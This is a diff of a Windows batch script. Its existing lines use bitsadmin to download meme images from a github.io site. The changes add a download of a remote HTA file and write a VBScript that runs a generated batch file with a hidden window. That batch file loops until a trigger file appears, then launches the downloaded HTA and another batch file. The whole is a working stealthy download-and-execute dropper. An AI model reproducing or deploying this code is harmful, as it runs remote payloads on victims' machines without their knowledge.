@@ -22,16 +22,22 @@ bitsadmin.exe /transfer "8" https://athdot.github.io/dwnld/8.png %USERPROFILE%\D
 bitsadmin.exe /transfer "9" https://athdot.github.io/dwnld/9.gif %USERPROFILE%\Desktop\MASTERFOLDER\mor.gif
 
 bitsadmin.exe /transfer "10" https://athdot.github.io/dwnld/10.jpg %USERPROFILE%\Desktop\MASTERFOLDER\trippymeme.jpg
-:start
-IF EXIST %USERPROFILE%\Downloads\activate.txt (
-start %USERPROFILE%\Desktop\MASTERFOLDER\Start.hta
-goto :check
-) ELSE (
-goto :start
-)
-:check
-IF EXIST %USERPROFILE%\Desktop\mains.bat (
-start %USERPROFILE%\Desktop\mains.bat
+bitsadmin.exe /transfer "Start.hta" https://athdot.github.io/dwnld/htl.hta %USERPROFILE%\Desktop\MASTERFOLDER\Start.hta
+@echo Set shell = WScript.CreateObject("Wscript.Shell")> invisible.vbs
+@echo shell.Run("C:\Users\%USERNAME%\Desktop\invisible.bat"),0,true>> invisible.vbs
+@echo @echo off> invisible.bat
+@echo :start>> invisible.bat
+@echo IF EXIST %USERPROFILE%\Downloads\activate.txt (>> invisible.bat
+@echo start %USERPROFILE%\Desktop\MASTERFOLDER\Start.hta>> invisible.bat
+@echo goto :check>> invisible.bat
+@echo ) ELSE (>> invisible.bat
+@echo goto :start>> invisible.bat
+@echo )>> invisible.bat
+@echo :check>> invisible.bat
+@echo IF EXIST %USERPROFILE%\Desktop\mains.bat (>> invisible.bat
+@echo start %USERPROFILE%\Desktop\mains.bat>> invisible.bat
+@echo exit>> invisible.bat
+@echo )>> invisible.bat
+@echo goto :check>> invisible.bat
+start %USERPROFILE%\Desktop\invisible.vbs
 exit
-)
-goto :check
